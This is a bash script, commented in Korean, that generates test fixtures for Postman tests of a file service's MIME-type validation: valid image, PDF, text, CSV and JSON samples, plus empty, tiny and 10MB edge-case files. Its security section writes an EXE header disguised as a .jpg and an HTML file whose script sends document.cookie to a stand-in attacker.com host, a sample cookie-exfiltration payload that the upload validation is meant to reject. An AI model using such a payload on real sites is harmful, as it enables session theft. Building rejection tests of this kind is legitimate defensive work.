#!/bin/bash

# File Service Test Files Generator
# 이 스크립트는 Postman 테스트에 필요한 모든 테스트 파일을 생성합니다.

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"
TEST_FILES_DIR="$PROJECT_ROOT/test-files"

echo "🚀 Generating test files for File Service API tests..."
echo "📁 Target directory: $TEST_FILES_DIR"

# 디렉토리 생성
mkdir -p "$TEST_FILES_DIR"

# ===============================================
# 1. 악성 파일 시뮬레이션 (Security Tests)
# ===============================================
echo "🔒 [1/5] Creating malicious files for security tests..."

# 1.1 EXE 파일 (MZ signature)
echo -ne '\x4D\x5A\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00' > "$TEST_FILES_DIR/malicious.exe.jpg"
echo "  ✅ malicious.exe.jpg (EXE with .jpg extension)"

# 1.2 HTML 파일 (XSS 시뮬레이션)
cat > "$TEST_FILES_DIR/malicious.html" << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Malicious File</title>
</head>
<body>
    <script>
        // This should be blocked
        alert('XSS Attack Attempt');
        fetch('http://attacker.com/steal?data=' + document.cookie);
    </script>
    <h1>This file should not be uploaded as image</h1>
</body>
</html>
EOF
echo "  ✅ malicious.html (HTML with XSS)"

# ===============================================
# 2. 정상 이미지 파일 (Compatibility Tests)
# ===============================================
echo "🖼️  [2/5] Creating valid image files..."

# 2.1 정상 JPEG (1x1 red pixel)
base64 -d > "$TEST_FILES_DIR/valid-image.jpg" << 'EOF'
/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0a
HBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIy
MjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIA
AhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAv/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEB
AQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCwAA//
2Q==
EOF
echo "  ✅ valid-image.jpg (1x1 JPEG)"

# 2.2 JPEG 복사 (다른 이름)
cp "$TEST_FILES_DIR/valid-image.jpg" "$TEST_FILES_DIR/photo.jpg"
cp "$TEST_FILES_DIR/valid-image.jpg" "$TEST_FILES_DIR/image-with-wrong-mime.jpg"
cp "$TEST_FILES_DIR/valid-image.jpg" "$TEST_FILES_DIR/public-image.jpg"
echo "  ✅ photo.jpg, image-with-wrong-mime.jpg, public-image.jpg (copies)"

# 2.3 정상 PNG (1x1 blue pixel)
base64 -d > "$TEST_FILES_DIR/valid-image.png" << 'EOF'
iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9
awAAAABJRU5ErkJggg==
EOF
echo "  ✅ valid-image.png (1x1 PNG)"

# 2.4 PNG 복사
cp "$TEST_FILES_DIR/valid-image.png" "$TEST_FILES_DIR/receipt-scan.png"
echo "  ✅ receipt-scan.png (copy)"

# 2.5 SVG 이미지
cat > "$TEST_FILES_DIR/image.svg" << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100">
    <circle cx="50" cy="50" r="40" fill="#FF6B6B" stroke="#333" stroke-width="2"/>
    <text x="50" y="55" font-family="Arial" font-size="16" text-anchor="middle" fill="white">
        SVG
    </text>
</svg>
EOF
echo "  ✅ image.svg (SVG)"

# 2.6 WebP 이미지 (실제 WebP signature)
# RIFF....WEBP 시그니처를 가진 최소 WebP 파일
base64 -d > "$TEST_FILES_DIR/image.webp" << 'EOF'
UklGRiQAAABXRUJQVlA4IBgAAAAwAQCdASoBAAEAAwA0JaQAA3AA/vuUAAA=
EOF
echo "  ✅ image.webp (1x1 WebP)"

# ===============================================
# 3. 텍스트 기반 파일 (Fallback Tests)
# ===============================================
echo "📄 [3/5] Creating text-based files..."

# 3.1 TXT 파일
cat > "$TEST_FILES_DIR/document.txt" << 'EOF'
File Service Test Document
==========================

This is a plain text file for testing the fallback validation logic.
When file-type detection returns null, the system should validate 
using the client-provided Content-Type header.

Test Date: 2025-12-18
Purpose: Validate text/plain MIME type handling
EOF
echo "  ✅ document.txt (text/plain)"

# 3.2 CSV 파일
cat > "$TEST_FILES_DIR/data.csv" << 'EOF'
id,product_name,category,price,stock_quantity,created_at
1,Laptop Computer,Electronics,1299.99,50,2025-01-15
2,Office Chair,Furniture,249.50,120,2025-01-16
3,USB-C Cable,Accessories,19.99,500,2025-01-17
4,Wireless Mouse,Electronics,39.99,200,2025-01-18
5,Desk Lamp,Furniture,45.00,80,2025-01-19
EOF
echo "  ✅ data.csv (text/csv)"

# 3.3 JSON 파일
cat > "$TEST_FILES_DIR/config.json" << 'EOF'
{
  "application": "file-service",
  "version": "1.0.0",
  "features": {
    "mimeValidation": {
      "enabled": true,
      "usesMagicNumbers": true,
      "wildcardSupport": true
    },
    "publicAccess": {
      "enabled": true,
      "requiresAuth": false
    }
  },
  "contexts": [
    "product-image",
    "user-avatar",
    "user-document",
    "receipt",
    "business-verification-file"
  ],
  "testMetadata": {
    "generatedBy": "generate-test-files.sh",
    "purpose": "Postman API testing"
  }
}
EOF
echo "  ✅ config.json (application/json)"

# ===============================================
# 4. PDF 파일 (Wildcard Tests)
# ===============================================
echo "📑 [4/5] Creating PDF files..."

# 최소 유효 PDF (PDF signature)
cat > "$TEST_FILES_DIR/document.pdf" << 'EOF'
%PDF-1.4
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources <<
/Font <<
/F1 <<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
>>
>>
>>
>>
endobj
4 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
100 700 Td
(Test PDF) Tj
ET
endstream
endobj
xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000317 00000 n 
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
410
%%EOF
EOF
echo "  ✅ document.pdf (application/pdf)"

# PDF 복사
cp "$TEST_FILES_DIR/document.pdf" "$TEST_FILES_DIR/private-document.pdf"
echo "  ✅ private-document.pdf (copy)"

# ===============================================
# 5. 엣지 케이스 (Edge Cases)
# ===============================================
echo "⚠️  [5/5] Creating edge case files..."

# 5.1 빈 파일
touch "$TEST_FILES_DIR/empty-file.txt"
echo "  ✅ empty-file.txt (0 bytes)"

# 5.2 대용량 파일 (10MB - size limit 테스트용)
if command -v dd &> /dev/null; then
    dd if=/dev/zero of="$TEST_FILES_DIR/large-file.bin" bs=1M count=10 2>/dev/null
    echo "  ✅ large-file.bin (10MB)"
else
    # dd가 없으면 Python으로 생성
    python3 << 'PYTHON_EOF'
with open('test-files/large-file.bin', 'wb') as f:
    f.write(b'\x00' * (10 * 1024 * 1024))
PYTHON_EOF
    echo "  ✅ large-file.bin (10MB) - created with Python"
fi

# 5.3 매우 작은 파일 (1 byte)
echo -n "x" > "$TEST_FILES_DIR/tiny-file.txt"
echo "  ✅ tiny-file.txt (1 byte)"

# 5.4 특수문자 파일명 테스트
echo "test content" > "$TEST_FILES_DIR/파일명-with-한글.txt"
echo "  ✅ 파일명-with-한글.txt (Unicode filename)"

# ===============================================
# 완료 메시지
# ===============================================
echo ""
echo "✅ All test files generated successfully!"
echo ""
echo "📊 Summary:"
ls -lh "$TEST_FILES_DIR" | tail -n +2 | wc -l | xargs echo "  - Total files:"
du -sh "$TEST_FILES_DIR" | cut -f1 | xargs echo "  - Total size:"
echo ""
echo "📁 Files location:"
echo "  $TEST_FILES_DIR"
echo ""
echo "🎯 Next steps:"
echo "  1. Import Postman collection: File-Service-MIME-Validation.postman_collection.json"
echo "  2. Set 'authToken' in Collection Variables (get JWT from login API)"
echo "  3. Update file paths in requests to point to: $TEST_FILES_DIR"
echo "  4. Run tests!"
echo ""
echo "📚 See postman/README.md for detailed instructions"


